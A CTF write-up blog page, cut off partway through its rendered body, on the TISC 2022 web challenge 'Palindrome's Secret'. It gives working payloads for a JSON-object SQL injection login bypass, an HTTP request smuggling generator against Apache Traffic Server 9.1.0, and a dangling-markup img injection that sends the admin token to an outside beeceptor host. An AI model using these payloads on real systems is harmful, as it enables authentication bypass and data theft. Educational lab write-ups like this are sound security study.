<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TISC 2022 Web Palindrome's Secret | Quentin</title><meta name=keywords content="ctf,tisc-2022,web,nodejs,express,mysql,traffic-server,proxy,sqli,http-request-smuggling,dangling-markup-injection,html-injection"><meta name=description content="Palindrome&rsquo;s Secret Challenge Description This was a Web challenge unlocked at level 5 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge."><meta name=author content="Quentin Khoo"><link rel=canonical href=https://quentinkhoo.github.io/posts/tisc-2022-web-palindrome-secret/><link crossorigin=anonymous href=/assets/css/stylesheet.993f9097e8d870439c2a9670fc4104ef9ca11ba29707a5a8cb5095b67a2ae128.css integrity="sha256-mT+Ql+jYcEOcKpZw/EEE75yhG6KXB6Woy1CVtnoq4Sg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://quentinkhoo.github.io/images/peepoclap.gif><link rel=icon type=image/png sizes=16x16 href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="TISC 2022 Web Palindrome's Secret"><meta property="og:description" content="Palindrome&rsquo;s Secret Challenge Description This was a Web challenge unlocked at level 5 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge."><meta property="og:type" content="article"><meta property="og:url" content="https://quentinkhoo.github.io/posts/tisc-2022-web-palindrome-secret/"><meta property="og:image" content="https://quentinkhoo.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-12T00:05:00+08:00"><meta property="article:modified_time" content="2022-09-12T00:05:00+08:00"><meta property="og:site_name" content="Quentin"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://quentinkhoo.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="TISC 2022 Web Palindrome's Secret"><meta name=twitter:description content="Palindrome&rsquo;s Secret Challenge Description This was a Web challenge unlocked at level 5 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://quentinkhoo.github.io/posts/"},{"@type":"ListItem","position":3,"name":"TISC 2022 Web Palindrome's Secret","item":"https://quentinkhoo.github.io/posts/tisc-2022-web-palindrome-secret/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TISC 2022 Web Palindrome's Secret","name":"TISC 2022 Web Palindrome\u0027s Secret","description":"Palindrome\u0026rsquo;s Secret Challenge Description This was a Web challenge unlocked at level 5 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge.","keywords":["ctf","tisc-2022","web","nodejs","express","mysql","traffic-server","proxy","sqli","http-request-smuggling","dangling-markup-injection","html-injection"],"articleBody":"Palindrome’s Secret Challenge Description This was a Web challenge unlocked at level 5 that was part of the recent TISC 2022 CTF organised by CSIT. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge.\nIntroduction Palindrome’s Secret was an interesting web challenge that had 3 parts to it, an SQL Injection through parameterized queries, HTTP Request Smuggling and finally a Dangling Markup Injection. IMO, the HTTP Request Smuggling exploit was the most interesting hack that I learned through this CTF and definitely worth a writeup.\nStudying the Web Application \u0026 Source Code If we analyzed the docker-compose.yml file for the web application, we would notice that there are 4 services in total.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 version: \"3\" services: app: build: ./app privileged: true restart: always environment: - MYSQL_PASSWORD=REDACTED # NOT THE REAL PASSWORD - ADMIN_TOKEN=TISC{0:1:2:3:4:5:6:6:8:9} # NOT THE REAL FLAG - EMAIL=REDACTED@REDACTED # NOT THE REAL EMAIL - PASSWORD=REDACTED # NOT THE REAL PASSWORD - BASE_URL=http://localhost:8000 proxy: build: ./proxy restart: always ports: - 80:8080 db: image: mysql restart: always environment: - MYSQL_ROOT_PASSWORD=REDACTED # NOT THE REAL PASSWORD - MYSQL_DATABASE=palindrome volumes: - ./mysql-init:/docker-entrypoint-initdb.d redis: image: redis restart: always Right of the bat I noticed 3 key pieces of information:\nThere is a mysql database that’s exposed as the db service Only the proxy service is exposed publicly The flag is stored in an environment variable in the app service as ADMIN_TOKEN Playing around with the web application, I realised that there was no way I could navigate to any other resources and I always got redirected to the login service. This is where I started to suspect an SQL Injection as the first step to this challenge.\nThe db service had nothing interesting so I started of by studying the application’s main.js source code and its routes:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const mysql = require('mysql') const express = require('express') const session = require('express-session') //** Omitted **// const db = mysql.createConnection({ host : 'db', user : 'web', password : process.env.MYSQL_PASSWORD, database : 'palindrome' }); //** Omitted **// const app = express() const port = 8000 So, we have an express application running on port 8000 that uses mysql as the backend database (as we saw earlier from the docker-compose.yml file).\n1 2 3 4 5 6 7 8 9 10 11 // Application Routes app.get ('/login', getLoginHandler) app.post ('/login', postLoginHandler) app.get ('/index', authenticationMiddleware, indexHandler) app.get ('/token', authenticationMiddleware, getTokenHandler) app.post ('/token', authenticationMiddleware, postTokenHandler) app.get ('/verify', authenticationMiddleware, tokenVerifyHandler) app.get ('/report-issue', authenticationMiddleware, reportIssueHandler) app.post ('/do-report', authenticationMiddleware, doReportHandler) app.all ('/forbidden', authenticationMiddleware, forbiddenHandler) More importantly, based on the above routing information, our theories are confirmed, that no matter which endpoint is passed in, the authenticationMiddleware would always be processed first. So let’s take a look at what authenticationMiddleware does:\n1 2 3 4 5 6 7 8 9 10 const authenticationMiddleware = async (req, res, next) =\u003e { if (req.session.userId) { if (req.ip === '127.0.0.1') req.session.token = process.env.ADMIN_TOKEN next() } else return res.redirect('/login') } Ahhh, it seems like we have 2 very key pieces of information here:\nIf req.session.userId is not set, the application redirects the user to the /login endpoint. If the req.ip is 127.0.0.1, the req.session.token is set to the ADMIN_TOKEN, which as we saw earlier, is the flag. Let’s ignore the second part for now and focus on how to set a req.session.userId. If we did a search on the main.js, we would realise that the only other place req.session.userId is mentioned is in the postLoginHandler, so lets take a look at that:\n1 2 3 4 5 6 7 8 9 10 11 12 const postLoginHandler = async (req, res) =\u003e { const { email, password } = req.body if (!email || !password) return res.status(400).send({ message: 'Missing email or password' }) const rows = await query(`SELECT * FROM users WHERE email = ? AND password = ?`, [email, password]) if (rows.length === 0) return res.status(401).send({ message: 'Invalid email or password' }) req.session.userId = rows[0].id return res.status(200).send({ message: \"Success\" }) } SQL Injection through Query Parameterization Hmmm, based on the previous section it seems like we have Query Parameterization, which should TECHNICALLY protect us from SQLi, or does it?\nI did a bit of digging around and eventually came across an article that was referenced from this article, which describes the exact scenario we are facing, an express application that does parameterized queries.\nIn short, the article describes that “due to certain specifications in express, one can pass in to the parameters a different value type like an Object, Boolean or an Array”.\nTo elaborate further, this means that we can pass in an Object like a JSON object instead of the expected String into the username or password field. In other words, instead of:\n1 2 3 4 { \"email\":\"email@email.com\", \"password\":\"password\"\" } We can instead pass in a javascript object to of the fields and express would interpret it as a valid SQL statement.\n1 2 3 4 { \"email\":{\"email\":1}, \"password\":{\"password\":1} } On mysql’s side, the SQL statement would be interpreted like this:\n1 SELECT * FROM users WHERE email = `email` = 1 AND password = `password` = 1; and because email = `email` and password = `password` both evaluates to 1, which evaluates to the following:\n1 SELECT * FROM users WHERE 1 = 1 AND 1 = 1; and finally, mysql evaluates the following:\n1 SELECT * FROM users; Notice that in the postLoginHandler code a 401 is returned only if the number of rows returned by mysql is 0:\n1 2 3 4 5 if (rows.length === 0) return res.status(401).send({ message: 'Invalid email or password' }) req.session.userId = rows[0].id return res.status(200).send({ message: \"Success\" }) Thankfully enough, there is only one user that is registered in the database as seen in in mysql-init/init.sql file:\n1 INSERT INTO `users` (`email`, `password`) VALUES (\"REDACTED@REDACTED\", \"REDACTED\"); Here’s a script that I used to authenticate and print a cookie that can be used for the other parts of this challenge:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import requests import json url = \"http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627\" body = {\"email\": {\"email\":1}, \"password\": {\"password\":1} } login_url = f\"{url}/login\" r = requests.post(login_url, json=body) for c in r.cookies: if c.name == \"connect.sid\": print(c.name, c.value) I ran the script to get a cookie:\n1 2 └─$ python3 login.py connect.sid s%3AZtg1Ilaj_1kRPexPD2nopZUCN0SF_GIF.ESM4lx5LkmWvf57fvccsa%2Bh8ADOVPGLGZO1Sh4YMidg I put it in the browser and success, I have bypassed the authentication system and can successfully navigate to other parts of the web application!\nHTTP Request Smuggling Let’s go back and take a look at our authenticationMiddleware again:\n1 2 3 4 5 6 7 8 9 10 const authenticationMiddleware = async (req, res, next) =\u003e { if (req.session.userId) { if (req.ip === '127.0.0.1') req.session.token = process.env.ADMIN_TOKEN next() } else return res.redirect('/login') } It seems like in order to set the req.session.token as the FLAG, we would have to make a request from 127.0.0.1. The first thing that stood out to me was the POST /do-report endpoint, which when you attempt to make a request to it externally, it returns a 403 forbidden.\nI guess it’s time to take a deeper look at the proxy service itself! Let’s first inspect the proxy software being used from the Dockerfile itself:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 FROM ubuntu:20.04 RUN apt-get update \u0026\u0026 DEBIAN_FRONTEND=noninteractive apt-get upgrade -y RUN DEBIAN_FRONTEND=noninteractive apt-get install -y curl build-essential libssl-dev libpcre3-dev zlib1g-dev WORKDIR /ats RUN curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.1.0.tar.bz2 \u003e ats.tar.bz2 \u0026\u0026 \\ tar xf ats.tar.bz2 \u0026\u0026 \\ cd trafficserver-9.1.0 \u0026\u0026 \\ ./configure --prefix=/opt/ts \u0026\u0026 \\ make \u0026\u0026 \\ make install COPY remap.config /opt/ts/etc/trafficserver/remap.config RUN chmod +r /opt/ts/etc/trafficserver/remap.config CMD [\"/opt/ts/bin/traffic_manager\"] Alright, it seems like we’re using Apache Traffic Server 9.1.0 as the proxying software.\nLet’s inspect the remap.config configuration file for it:\n1 2 3 4 5 6 7 8 map /login http://app:8000/login map /index http://app:8000/index map /token http://app:8000/token map /verify http://app:8000/verify map /report-issue http://app:8000/report-issue map /static http://app:8000/static map /do-report http://app:8000/forbidden regex_redirect http://(.*)/ http://$1/index Indeed, as we can see from the config file any requests to do-report gets redirected to /forbidden.\nAt this point I started thinking, what can one do assumming a request to POST /do-report can be made? In docker environments, it is possible to directly exec into a container and run commands from it. Let’s start running our application locally!\nWe first run the entire application with docker-compose up -d\nWe can then list out the available docker containers with docker ps -a:\n1 2 3 4 5 6 └─$ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7c623c1e94c5 mysql \"docker-entrypoint.s…\" 4 days ago Up 2 hours 3306/tcp, 33060/tcp distrib_db_1 455383c8aaf4 distrib_app \"/usr/bin/dumb-init …\" 4 days ago Up 2 hours distrib_app_1 18b75193db78 distrib_proxy \"/opt/ts/bin/traffic…\" 4 days ago Up 2 hours 0.0.0.0:80-\u003e8080/tcp, :::80-\u003e8080/tcp distrib_proxy_1 586b3eb5af97 redis \"docker-entrypoint.s…\" 4 days ago Up 2 hours 6379/tcp In this case, we are interested in the distrib_app_1 container. Let’s exec into it using docker exec -it distrib_app_1 bash.\nLet’s try making a request to the GET /token endpoint using curl:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ docker exec -it distrib_app_1 bash inmate@455383c8aaf4:~/app$ curl -i -X POST --url \"http://localhost:8000/login\" -H \"Content-Type: application/json\" --data '{\"email\":{\"email\":1}, \"password\":{\"password\":1}}' HTTP/1.1 200 OK X-Powered-By: Express Content-Security-Policy: default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none' Cross-Origin-Opener-Policy: same-origin Content-Type: application/json; charset=utf-8 Content-Length: 21 ETag: W/\"15-uFFjCr0SbbbFb/CsC0M2sF++swo\" Set-Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI; Path=/; Expires=Mon, 12 Sep 2022 19:00:24 GMT; HttpOnly Date: Sun, 11 Sep 2022 19:00:24 GMT Connection: keep-alive Keep-Alive: timeout=5 {\"message\":\"Success\"} 1 2 3 inmate@455383c8aaf4:~/app$ curl --url \"http://localhost:8000/token\" -H \"Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;\" #### Omitted #### Your token is TISC{0:1:2:3:4:5:6:6:8:9}\nWoah woah woah, our (fake) flag is actually in the response! So it seems like a potential attack pattern would be to:\nUsing the POST /do-report, make a request to GET /token Let’s go ahead and make a request to POST /do-report from within the docker container, while using that authenticated cookie.\n1 2 inmate@455383c8aaf4:~/app$ curl -X POST --url \"http://localhost:8000/do-report\" -H \"Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;\" -H \"Content-Type: application/json\" -d '{\"url\":\"http://localhost:8000/token\"}' OK Huh…. we only get one OK, which is not exactly very useful. Let’s look at the logs of the container:\n1 2 3 4 5 └─$ docker logs --follow distrib_app_1 [*] Listening on port 8000 [INFO] Starting browser [*] Visiting http://localhost:8000/token [*] Done visiting http://localhost:8000/token Okay, it seems like there was an attempt to visit the GET /token endpoint through a browser.\nLet’s study the source code of the doReportHandler portion a little bit more, which we can find in report.js.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 const doReportHandler = async (req, res) =\u003e { if (!browser) { console.log('[INFO] Starting browser') browser = await puppeteer.launch({ headless: false, args: [ \"--no-sandbox\", \"--disable-background-networking\", \"--disk-cache-dir=/dev/null\", \"--disable-default-apps\", \"--disable-extensions\", \"--disable-desktop-notifications\", \"--disable-gpu\", \"--disable-sync\", \"--disable-translate\", \"--disable-dev-shm-usage\", \"--hide-scrollbars\", \"--metrics-recording-only\", \"--mute-audio\", \"--no-first-run\", \"--safebrowsing-disable-auto-update\", \"--window-size=1440,900\", ] }) } const url = req.body.url if ( url === undefined || (!url.startsWith('http://') \u0026\u0026 !url.startsWith('https://')) ) { return res.status(400).send({ error: 'Invalid URL' }) } try { console.log(`[*] Visiting ${url}`) await visit(url) console.log(`[*] Done visiting ${url}`) return res.sendStatus(200) } catch (e) { console.error(`[-] Error visiting ${url}: ${e.message}`) return res.status(400).send({ error: e.message }) } } Hmmm, a puppeteer browsing, which kind of suggests some potential Cross-Site Scripting exploit? But let’s ignore this for now and focus on what visit is doing:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const visit = async (url) =\u003e { const ctx = await browser.createIncognitoBrowserContext() const page = await ctx.newPage() await page.goto(LOGIN_URL, { timeout: 5000, waitUntil: 'networkidle2' }) await page.waitForSelector('form') await page.type('input[name=email]', process.env.EMAIL) await page.type('input[name=password]', process.env.PASSWORD) await page.click('button[type=\"submit\"]') await page.waitForTimeout(1000) try { await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' }) await page.waitForTimeout(1000) } finally { await page.close() await ctx.close() } } Ahhhh, okay so to put it in layman terms, report.js is doing the following:\nvisit logs the browser into the application with the pre-defined credentials stored in environment variables as seen in the docker-compose.yml earlier. This means that the browser visits the passed-in url from the context of an authenticated admin user when this is performed through the POST /do-report endpoint. Let’s for now, focus trying to make a request to the POST /do-report endpoint. After some research I came across this HTTP Request Smuggling vulnerability for nodejs and with more googling around I eventually came across this CVE for the Apache Traffic Server 9.1.0 (which turns out to be similar to SEETF 2022’s flagportal revenge challenge).\nOkay, so it seems like this challenge wants us to perform a HTTP Request Smuggling attack in order to bypass the proxy whitelist (as defined in the remap.config) and make a POST /do-report request directly through the application container itself.\nAbusing Improper Chunk Extension Validations Let’s first understand the conditions necessary for this HTTP Request Smuggling to work:\nApache Traffic Server 9.1.0 processe Line Feed (LF) (\\n) as line endings instead of Carriage Return Line Feed (CRLF) (\\r\\n). lhttp in NodejS v16.3.0 doesn’t parse chunk extensions properly, but ignores every byte until a (CR) \\r is reached. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 GET /login HTTP/1.1 Host: localhost Transfer-Encoding: chunked 2 ; xx f2 0 POST /do-report HTTP/1.1 Host: app:8000 Content-Type: application/json Content-Length: 37 Cookie: connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8 {\"url\":\"http://localhost:8000/token\"} 0 If you’re not familiar with how Chunked Transfer Encoding works, I do suggest you read up about it a little before carrying on with the rest of this writeup\nLet’s try to understand what is happening. In the example above, ; xx is treated as the chunk extension and 2 is intrepreted as the chunk size.\nNow, because ATS does not treat CRLF as the line ending but instead it treats LF as the line ending, we can modify the chunked extension to a payload like \\nxx and as a result, ATS would see the following request:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 GET /login HTTP/1.1 Host: localhost Transfer-Encoding: chunked 2 \\nxx f2 0 POST /do-report HTTP/1.1 Host: app:8000 Content-Type: application/json Content-Length: 37 Cookie: connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8 {\"url\":\"http://localhost:8000/token\"} 0 From ATS’ perspective, it only sees a single request to GET /login and because of the first 0\\r\\n (AKA the final byte indicator for chunked transfer encoding) ATS does not see beyond that.\nOn the other hand, NodeJS actually sees both requests, the first request to GET /login as well as the second smuggled request, to POST /do-report.\n2 \\nxx actually gets ignored by NodeJS due to the lack of \\r character and because of that, it ends up treating f2 as the chunk size. We can then do some calculations to correctly pass in the correct chunk size to be interpreted by the NodeJS server.\nFinally, here’s a python script that I used to generate the final payload to perform the request smuggling.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import sys body = b'{\"url\":\"http://localhost:8000/token\"}' cookie = b\"connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8\" smuggled = ( b\"POST /do-report HTTP/1.1\\r\\n\" + b\"Host: app:8000\\r\\n\" + b\"Content-Type: application/json\\r\\n\" + b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\" + b\"Cookie: \" + cookie + b\"\\r\\n\" + b\"\\r\\n\" + body + b\"\\r\\n\" b\"\\r\\n\" + b\"0\\r\\n\" + b\"\\r\\n\" ) def h(n): return hex(n)[2:].encode() smuggled_len = h(len(smuggled) - 7 + 5) first_chunk_len = h(len(smuggled_len)) sys.stdout.buffer.write( b\"GET /login HTTP/1.1\\r\\n\" + b\"Host: localhost\\r\\n\"+ b\"Transfer-Encoding: chunked\\r\\n\" + b\"\\r\\n\" + first_chunk_len + b\" \\n\" + b\"x\"*len(smuggled_len) + b\"\\r\\n\" + smuggled_len + b\"\\r\\n\" + b\"0\\r\\n\" + b\"\\r\\n\" + smuggled ) I ran the script locally by running python3 hrs.py | nc localhost 80. We can verify that a request to do-report was made by inspecting the docker container logs (or alternatively point the url parameter in the POST /do-report endpoint to a self-controlled domain and inspect the request made).\n1 2 3 └─$ docker logs --follow distrib_app_1 [*] Visiting http://localhost:8000/token [*] Done visiting http://localhost:8000/token Credits to zeyu2001 for the solution writeup on flagportal revenge, which helped me understand the whole HRS much better! Do checkout his website and his other writeups too :)\nData Exfiltration via Dangling Markup Injection Okay, we have found a way to externally trigger the POST /do-report endpoint, but how do we exfiltrate the req.session.token data? Remember earlier on when we noticed the use of puppeteer and the potential idea of an XSS? Let’s look at that!\nAfter some digging around, it seems like the GET /token?token= endpoint has unsanitized reflected input when generating a token through POST /token.\nInitially I tried injecting XSS payloads but all of which seemed to not execute, making me realise that an XSS was (probably) not possible.\nI decided to analyse the Content-Security-Policy to understand further and voila, a realisation!\n1 2 3 4 5 6 7 8 9 10 11 app.use((req, res, next) =\u003e { res.setHeader( 'Content-Security-Policy', \"default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none'\" ) res.setHeader( 'Cross-Origin-Opener-Policy', 'same-origin' ) next() }) Hmmm, turns out the CSP does indeed allow the loading of external image sources. I started looking around for other forms of non-xss client based attacks and eventually I came across Dangling Markup Injection, which seemed rather promising.\nI tried to generate a token with the username payload, using beeceptor as a way to inspect my request. If the image does load a request would be triggered to my temporary beeceptor endpoint.\n1 \"/\u003e\u003cimg src=\"https://test-dangling-markup.free.beeceptor.com? And success! I can see the a request being triggered and the query parameter in my beeceptor endpoint contains the exfiltrated response to the GET /token?token= endpoint as follows:\n1 2 3 { \" asks for your token, you can give them this token: TISC{a:q:a:c:n:s:w:g:o:4}.","wordCount":"3679","inLanguage":"en","datePublished":"2022-09-12T00:05:00+08:00","dateModified":"2022-09-12T00:05:00+08:00","author":{"@type":"Person","name":"Quentin Khoo"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://quentinkhoo.github.io/posts/tisc-2022-web-palindrome-secret/"},"publisher":{"@type":"Organization","name":"Quentin","logo":{"@type":"ImageObject","url":"https://quentinkhoo.github.io/images/peepoclap.gif"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://quentinkhoo.github.io accesskey=h title="Home (Alt + H)"><img src=https://quentinkhoo.github.io/images/peepoclap.gif alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://quentinkhoo.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://quentinkhoo.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://quentinkhoo.github.io/about/ title=Whoami><span>Whoami</span></a></li><li><a href=https://quentinkhoo.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://quentinkhoo.github.io>Home</a>&nbsp;»&nbsp;<a href=https://quentinkhoo.github.io/posts/>Posts</a></div><h1 class=post-title>TISC 2022 Web Palindrome's Secret</h1><div class=post-meta><span title='2022-09-12 00:05:00 +0800 +0800'>September 12, 2022</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;3679 words&nbsp;·&nbsp;Quentin Khoo&nbsp;|&nbsp;<a href=https://github.com/quentinkhoo/quentinkhoo.github.io/content/posts/TISC-2022-web-palindrome-secret.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#palindromes-secret-challenge-description>Palindrome&rsquo;s Secret Challenge Description</a></li><li><a href=#introduction>Introduction</a></li><li><a href=#studying-the-web-application--source-code>Studying the Web Application & Source Code</a></li><li><a href=#sql-injection-through-query-parameterization>SQL Injection through Query Parameterization</a></li><li><a href=#http-request-smuggling>HTTP Request Smuggling</a><ul><li><a href=#abusing-improper-chunk-extension-validations>Abusing Improper Chunk Extension Validations</a></li></ul></li><li><a href=#data-exfiltration-via-dangling-markup-injection>Data Exfiltration via Dangling Markup Injection</a></li><li><a href=#putting-it-all-together>Putting it all together</a></li><li><a href=#wrapping-it-all-up-like-a-burrito>Wrapping it all up like a burrito</a></li></ul></nav></div></details></div><div class=post-content><h2 id=palindromes-secret-challenge-description>Palindrome&rsquo;s Secret Challenge Description<a hidden class=anchor aria-hidden=true href=#palindromes-secret-challenge-description>#</a></h2><p>This was a Web challenge unlocked at level 5 that was part of the recent <a href=https://www.csit.gov.sg/events/tisc/tisc-2022>TISC 2022</a> CTF organised by <a href=https://www.csit.gov.sg/>CSIT</a>. TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge.</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>Palindrome&rsquo;s Secret was an interesting web challenge that had 3 parts to it, an SQL Injection through parameterized queries, <a href=https://portswigger.net/web-security/request-smuggling>HTTP Request Smuggling</a> and finally a <a href=https://portswigger.net/web-security/cross-site-scripting/dangling-markup>Dangling Markup Injection</a>. IMO, the HTTP Request Smuggling exploit was the most interesting hack that I learned through this CTF and definitely worth a writeup.</p><h2 id=studying-the-web-application--source-code>Studying the Web Application & Source Code<a hidden class=anchor aria-hidden=true href=#studying-the-web-application--source-code>#</a></h2><p>If we analyzed the <code>docker-compose.yml</code> file for the web application, we would notice that there are 4 services in total.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-docker data-lang=docker><span class=line><span class=cl>version: <span class=s2>&#34;3&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>services:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  app:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    build: ./app<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    privileged: true<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    restart: always<span class=err>
